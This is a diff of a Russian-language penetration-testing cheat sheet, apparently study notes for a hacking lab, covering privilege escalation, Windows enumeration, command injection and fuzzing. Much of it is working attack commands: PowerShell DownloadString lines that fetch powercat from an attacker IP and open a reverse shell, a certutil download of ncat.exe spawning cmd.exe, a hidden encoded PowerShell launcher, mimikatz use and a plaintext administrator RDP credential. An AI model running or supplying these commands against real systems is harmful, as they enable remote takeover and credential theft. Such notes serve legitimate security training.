@@ -74,6 +74,8 @@ nc -nv <ip> <port>
 	соединиться по порту к удаленному ip
 python -m http.server 80
 	2е соединение с атакуемой машиной из 1го шелла для превышения прав доступа к удаленному узлу:
+-	python -m pyftpdlib -u user -P pass -p 21 -w
+		временный FTP сервер в текущей папке
 -	wget http://<ip of python server listener>/linpeas.sh
 	curl -O http://<ip:port>/linpeas.sh
 		скачать скрипт превышения прав или скрипт поиска полезной информации (linpeas.sh)
@@ -115,7 +117,7 @@ showmount -e <ip>
 mount -t ntf <ip>:/<remote path> <local path>
 mount -t nfs 192.168.43.281:/srv/nfs /mnt/dev
 	примонтировать nfs систему локально в local path из пути remote path, найденном утилитой showmaount
-xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
+xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
 	rdp соединение (remmina тоже)
 hURL	декодирование base64 и другого
 
@@ -143,7 +145,8 @@ sc start/query/stop <service name>
 	для перезапуска атакуемого сервиса на Windows, имя сервиса - из вывода winPEAS.exe
 sc query windefend
 netsh firewall show state
-
+C:\Windows\System32\drivers\etc\hosts
+	аналог /etc/hosts
 whoami /priv
 	проверка текущих привелегий
 mimikatz.exe
@@ -175,6 +178,7 @@ echo -n 'Get-Process' | iconv -t UTF-16LE | base64 -w 0
 	ВАЖНО!!! команда должна быть в одинарных кавычках, а не двойных (bash будет пытаться раскрыть переменные, начинающиеся с $)
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
 	сканирование портов, когде нет nmap
+exiftool file.pdf	метаданные о pdf файле
 
 ================XSS/CSRF
 стащить куки, выпонить код в браузере жертвы, получить куки, nonce
@@ -248,9 +252,13 @@ curl http://192.168.180.16/php-reverse-shell.php
 	cmd1;cmd2
 	$(pwd)
 	`pwd`
-IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.231/powercat.ps1");powercat -c 192.168.45.231 -p 4444 -e powershell 
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.164/powercat.ps1");powercat -c 192.168.45.164 -p 4444 -e powershell 
 IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.231%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.231%20-p%204444%20-e%20powershell
 	заброска powercat (python -m http.server 80) с запуском reverse shell (nc -nlvp 4444)
+powershell.exe -nop -w hidden -enc "<base64 powershell command>"
+	тоже самое для заброски base64
+echo -n '<command for powershell in UTF-8>' | iconv -t UTF-16LE | base64 -w 0
+	кодирование команды из UTF-16LE в base64: powershell требует кодировки символов команды в UTF-16LE, а обычно это UTF-8
 cmd=cmd.exe /c "cd /d %TEMP% && certutil -urlcache -split -f http://192.168.45.231/ncat.exe ncat.exe && ncat.exe 192.168.45.231 4444 -e cmd.exe"
 	reverse shell, если есть только cmd.exe, надо повесить python -m http.server на папку с ncat.exe, открыть порт nc -lvp 4444
 
@@ -360,7 +368,7 @@ IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay
 
 ================FUZZING
 gobuster - на Go, только консоль (более современная версия dirb и dirbuster)
-gobuster dir -u http://192.168.10.10 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://192.168.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,asp,aspx
 	есть ключ -t (thread), по умолчанию 10
 	скрипт --script=http-enum в nmap также перебирает папки на хосте (вместе с -p80)
 gobuster vhost -u http://target.com -w subdomains.txt
